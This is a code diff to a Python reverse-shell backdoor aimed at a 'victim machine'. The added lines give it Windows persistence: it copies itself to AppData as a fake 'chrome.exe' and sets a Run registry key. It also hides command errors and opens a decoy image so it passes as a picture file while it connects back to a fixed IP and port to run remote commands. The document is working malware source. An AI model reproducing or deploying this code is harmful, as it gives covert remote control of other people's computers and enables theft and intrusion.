@@ -1,4 +1,4 @@
-import socket,subprocess,json,os,base64
+import socket,subprocess,json,os,base64,sys,shutil
 
 
 # Victim - Victim Machine
@@ -7,11 +7,19 @@ import socket,subprocess,json,os,base64
 
 class Backdoor:
     def __init__(self,ip,port):
+        self.persistence()
         self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         self.connection.connect((ip,port))
         
+    def persistence(self):
+        virus_file_location = os.environ['appdata']+ "\\chrome.exe"
+        if not os.path.exists(virus_file_location):
+            shutil.copyfile(sys.executable,virus_file_location)
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v tata /t REG SZ /d "' + virus_file_location + '"',shell=True)
+                
     def execute_command(self,command):
-        return subprocess.check_output(command,shell=True)  
+        NULL = open(os.devnull,'wb')
+        return subprocess.check_output(command,shell=True,stderr=NULL,stdin=NULL)  
         
     def box_send(self,data):
         json_data = json.dumps(data)
@@ -40,7 +48,7 @@ class Backdoor:
             try:
                 if command[0] == "exit":
                     self.connection.close()
-                    exit()
+                    sys.exit()
                 elif command[0] == "cd" and len(command) > 1:
                     command_result = self.change_directory(command[1])
                 elif command[0] == "download":
@@ -54,5 +62,11 @@ class Backdoor:
             self.box_send(command_result)
 
 
-backdoor = Backdoor("192.168.1.11",4444)
-backdoor.run()
+file_name = sys._MEIPASS + "/sample.jpg"
+subprocess.Popen(file_name,shell=True)
+
+try:
+    backdoor = Backdoor("192.168.1.11",4444)
+    backdoor.run()
+except Exception:
+    sys.exit()
